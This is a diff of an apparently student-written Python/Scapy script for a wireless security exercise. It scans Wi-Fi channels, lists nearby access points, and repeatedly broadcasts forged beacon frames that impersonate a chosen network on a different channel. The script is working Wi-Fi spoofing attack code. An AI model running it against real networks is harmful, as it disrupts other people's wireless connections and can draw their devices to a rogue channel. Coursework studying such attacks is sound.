@@ -1,5 +1,13 @@
 #!/usr/bin/env python
 
+# Authors:
+# - Yanick Thomann
+# - Jean Gachet
+# - David Gallay
+# 
+# This script is made for exercise 2
+# Scan all channels for APs and emit a spoofed beacon for selected AP 
+
 from scapy.all import *
 import sys
 import argparse
@@ -9,13 +17,12 @@ import os
 # A class to represent a Wifi AP
 class AP:
     # Constructor
-    def __init__(self, bssid, ssid, channel, crypto, power, rsn):
+    def __init__(self, bssid, ssid, channel, crypto, power):
         self.bssid = bssid
         self.ssid = ssid
         self.channel = channel
         self.crypto = crypto
         self.power = power
-        self.rsn = rsn
     # Display a single AP
     def display(self):
         print("----------------------------------")
@@ -57,7 +64,6 @@ def callback(pkt):
     if pkt.haslayer(Dot11Beacon):
         bssid = pkt[Dot11].addr2
         ssid = pkt[Dot11Elt].info.decode()
-        rsn = pkt[Dot11EltRSN].info
         try:
             dbm_signal = pkt.dBm_AntSignal
         except:
@@ -66,7 +72,7 @@ def callback(pkt):
         channel = stats.get("channel")
         crypto = stats.get("crypto")
 
-        wifi = AP(bssid, ssid, channel, crypto, dbm_signal, rsn)
+        wifi = AP(bssid, ssid, channel, crypto, dbm_signal)
 
         if not bssid_already_scanned(wifi.bssid):
             AP_LIST.append(wifi)
@@ -89,34 +95,27 @@ def change_channel(interface, channel):
 
 def spoof_beacon(ap, interface):
     new_channel = 0
-    if ap.channel in (1, 6):
-        new_channel = ap.channel + 6
-    elif ap.channel in (11, ):
-        new_channel = ap.channel - 6
+    if ap.channel == 1:
+        new_channel = 7
+    elif ap.channel == 6:
+        new_channel = 12
+    elif ap.channel == 11:
+        new_channel = 5
     else:
         print(f'Not handled channel {ap.channel}')
-        return
+        exit()
+    
 
-    # Change channel to go on the same as attacked network
-    print(f'{interface} channel changed to {ap.channel} to send forged beacon')
-    change_channel(interface, ap.channel)
-
-    # Forge an beacon frame to inform clients on the network the channel change is occuring
+    # Forge an beacon frame to inform clients of the network the channel change is occuring
     dot11 = Dot11(type=0, subtype=8, addr1='FF:FF:FF:FF:FF:FF', addr2 = ap.bssid, addr3 = ap.bssid)
-    beacon = Dot11Beacon()
+    beacon = Dot11Beacon(cap='ESS+privacy')
     essid = Dot11Elt(ID='SSID', info=ap.ssid, len=len(ap.ssid))
     new_essid = Dot11Elt(ID="DSset", info=chr(new_channel))
-    rsn = Dot11Elt(ID='RSNinfo', info=ap.rsn)
-    frame = RadioTap()/dot11/beacon/essid/new_essid/rsn
-
-    frame.show()
-    print("\nHexDump of frame:")
-    hexdump(frame)
-    input("\nPress enter to start\n")
+    # Forge the frame
+    frame = RadioTap()/dot11/beacon/essid/new_essid
 
     # Send the forged beacon
-    sendp(frame, iface=interface, inter=0.500, loop=1)
-
+    sendp(frame, iface=interface, inter=0.100, loop=1)
 
 
 def main():
@@ -146,10 +145,11 @@ def main():
         packet_count = int(args.packet_count)
         
     # Sniff only as long as packet_count
-    for channel in range(1, 12):
-        print(f'Scanning channel {channel} for SSIDs')
+    channel = 1
+    while channel <= 12:
         sniff(iface=interface, prn = callback, count = packet_count)
-        channel = change_channel(interface, channel)
+        print(f'Scanned channel {channel} for SSIDs')
+        channel = increment_channel(interface, channel)
 
     # Display found SSIDs
     i = 0
@@ -160,17 +160,21 @@ def main():
     "Crypto".center(crypto_col_width, ' '),"|",
     "Power [dBm]".center(power_col_width, ' '),"|")
     print('-' * array_width)
-    for i, n in enumerate(AP_LIST):
+    for n in AP_LIST:
         n.display(i)
+        i += 1
 
+    # Ask user to select the SSID
     print("Which SSID do you want to spoof ? ")
     chosen = -1
     while chosen not in range(0, len(AP_LIST)):
         chosen = int(input("Choose SSID: "))
-        
-    # Send spoofed beacon with chosen AP
-    spoof_beacon(AP_LIST[chosen], interface)
 
+    # Send spoofed beacon with chosen AP
+    spoofed_ap = AP_LIST[chosen]
+    spoofed_ap.bssid = "DE:AD:CA:FE:F0:0D"
+
+    spoof_beacon(spoofed_ap, interface)
 
 if __name__ == "__main__":
     main()
